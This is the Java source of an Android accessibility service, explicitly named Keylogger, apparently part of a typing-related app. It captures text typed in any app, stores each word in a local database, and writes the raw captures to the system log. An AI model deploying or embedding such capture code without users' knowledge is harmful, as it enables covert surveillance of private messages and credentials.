package com.typekindly.app;
import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import java.util.List;

public class Keylogger extends AccessibilityService {
    private static final int MAX_BUFFER_SIZE = 1000; // May vary
    private static final double RESET_THRESHOLD = 70.0; // May vary
    private static final long TIMEOUT_MS = 5000; // May vary
    private String previousText = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> capturedText = event.getText();
            String capturedString = cleanText(capturedText.toString());

            // Do not capture texts that are too long
            if(capturedText.toString().length() > MAX_BUFFER_SIZE) {
                return;
            }
            // Log the word when buffer resets
            if(isBufferReset(previousText, capturedString)){
                if(previousText.length() > 1){
                    toLogWords(previousText);
                }
            }

            previousText = capturedString;
            cleanBuffer();
        }

    }

    private Runnable logTask = null;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private void cleanBuffer() {
        if (logTask != null) {
            handler.removeCallbacks(logTask);
        }

        logTask = () -> {
            if (!previousText.isEmpty()) {
                Log.v("Clean Buffer", "Delay Event Triggered: Contents processed");
                toLogWords(previousText);
                previousText = ""; // Reset after logging
            }
        };

        handler.postDelayed(logTask, TIMEOUT_MS);
    }

    private boolean isBufferReset(String oldText, String newText){
        Log.d("Keylogger Capture", "Current: " + newText);
        Log.d("Keylogger Capture", "Previous " + oldText);
        if (newText.isEmpty()) {
            return true;  // Full reset (message sent or deleted)
        }
        double diffPercentage = computeDifferencePercentage(oldText, newText);
        return diffPercentage > RESET_THRESHOLD;
    }

    private double computeDifferencePercentage(String oldText, String newText) {
        int removedChars = Math.abs(oldText.length() - newText.length());
        int maxLength = Math.max(oldText.length(), 1); // Avoid division by zero
        return (removedChars / (double) maxLength) * 100;  // Percentage difference
    }

    private String cleanText(String text){
        return text.toLowerCase().replaceAll("[^a-z \\n]", "");
    }


    private WordLogger wordLogger;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        wordLogger = new WordLogger(this); // `this` is a valid Context
    }

    private void toLogWords (String logwords) {
        Log.i("Keylogger Logged Raw", "Raw Capture: " + logwords);

        if (logwords.isEmpty()) {
            return;
        }

        String[] words = logwords.split("\\s+");

        for (String word : words) {
            wordLogger.logWordToDataBase(word);
        }
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }
}